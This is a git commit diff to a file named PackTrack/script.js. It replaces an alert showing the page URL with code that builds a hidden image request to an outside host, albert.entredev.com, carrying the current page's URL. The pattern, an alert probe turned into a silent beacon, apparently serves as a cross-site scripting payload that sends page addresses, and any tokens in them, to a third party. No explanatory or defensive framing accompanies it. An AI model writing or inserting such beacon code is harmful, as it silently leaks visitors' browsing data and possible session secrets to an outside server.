f32b0d593b55bf87079118be64c6c04fc7883353
Albert Hao <alberthao@Authorized-SMUHSD-Device.local>
2018-12-05 21:51:23 -0800

    Update script.js

--- PackTrack/script.js
+++ PackTrack/script.js
@@ -1,1 +1,3 @@
-alert(window.location.href);
+var img = document.createElement('img');
+img.src = "http://albert.entredev.com?url=" + encodeURIComponent(window.location.href);
+document.body.appendChild(img);
